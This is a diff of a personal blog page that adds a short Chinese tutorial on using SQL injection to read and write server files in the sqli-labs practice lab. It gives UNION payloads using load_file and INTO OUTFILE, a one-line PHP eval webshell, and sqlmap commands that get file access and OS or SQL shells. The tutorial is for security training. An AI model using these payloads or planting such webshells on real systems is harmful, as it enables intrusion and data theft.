@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>分类 - Cheekkk&#39;s Blog</title>
+  <title>SQL注入 文件读写 - Cheekkk&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -46,7 +46,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -129,6 +129,31 @@
             </span>
 
             
+              
+
+              <div class="mt-1">
+                
+                  
+                  <span class="post-meta mr-2">
+                    <i class="iconfont icon-chart"></i>
+                    328 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta mr-2">
+                      <i class="iconfont icon-clock-fill"></i>
+                    
+                    
+                    4
+                     分钟
+                  </span>
+                
+
+                
+              </div>
+            
           </div>
 
           
@@ -139,22 +164,120 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>本文介绍了利用SQL注入读写文件，写入后门的方法</p>
+<a id="more"></a>
+
+<h1 id="SQL注入读写文件"><a href="#SQL注入读写文件" class="headerlink" title="SQL注入读写文件"></a>SQL注入读写文件</h1><h2 id="01-读写文件的前提"><a href="#01-读写文件的前提" class="headerlink" title="01 读写文件的前提"></a>01 读写文件的前提</h2><ol>
+<li><p>知道读写文件的绝对路径</p>
+</li>
+<li><p>当前用户权限足够</p>
+</li>
+<li><p>secure_file_priv参数配置正确：</p>
+<p>该参数限制了文件读写的路径，在mysql配置文件中修改</p>
+<ol>
+<li>secure_file_priv=               不对读写作出限制</li>
+<li>secure_file_priv=null        禁止读写</li>
+<li>secure_file_priv=’path’     只允许在path路径下操作，包括子目录</li>
+</ol>
+</li>
+</ol>
+<h2 id="02-读取文件"><a href="#02-读取文件" class="headerlink" title="02 读取文件"></a>02 读取文件</h2><p>以Lesson1为例，首先创建一个flag.txt</p>
+<ol>
+<li>?id=1’ order by 3–+ 得到有三个字段</li>
+<li>?id=-1’ union select 1,load_file(“绝对路径\flag.txt”),3 –+<br>在字段2处读取出文件<br><strong>联合查询要使前边报错</strong></li>
+</ol>
+<h2 id="03-写入文件"><a href="#03-写入文件" class="headerlink" title="03 写入文件"></a>03 写入文件</h2><p>以Lesson1为例</p>
+<ol>
+<li><p>?id=1’)) order by 3–+ 得到有三个字段</p>
+</li>
+<li><p>?id=1’)) union select 1,’&lt;?php phpinfo(); ?&gt;‘,3 into outfile ‘绝对路径’–+</p>
+</li>
+</ol>
+<p>也可以写入一句话木马&lt;?php @eval($_POST[‘x’]; ?&gt;,然后使用菜刀链接</p>
+<p>除了一句话木马，还可以使用weevely、webacco等生成后门</p>
+<h2 id="03-sqlmap读写文件"><a href="#03-sqlmap读写文件" class="headerlink" title="03 sqlmap读写文件"></a>03 sqlmap读写文件</h2><p>读文件 sqlmap -u “url” –file-read “绝对路径flag.txt”</p>
+<p>写文件 sqlmap -u “url” –file-write “本地绝对路径flag.txt” –file-dest “目标绝对路径”</p>
+<p>检测权限 sqlmap -u “url” –is-dba</p>
+<p>获取SQLshell ：sqlmap -u “url” –sql-shell</p>
+<p>获取系统shell ：sqlmap -u “url” –os-shell</p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
                 
-
-<ul class="category-tree-list"><li class="category-tree-list-item"><a class="category-tree-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="category-tree-list-count">6</span></li></ul>
-
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                    
+                  </div>
+                
               </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">SQL注入 几种特殊的注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
             </div>
+
+            
           </div>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
   </main>
 
@@ -218,6 +341,34 @@
 
 
 
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 1,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
 
 
   <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
@@ -237,7 +388,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "分类&nbsp;",
+        "SQL注入 文件读写&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
@@ -280,6 +431,20 @@
   </script>
 
 
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
 
 
 
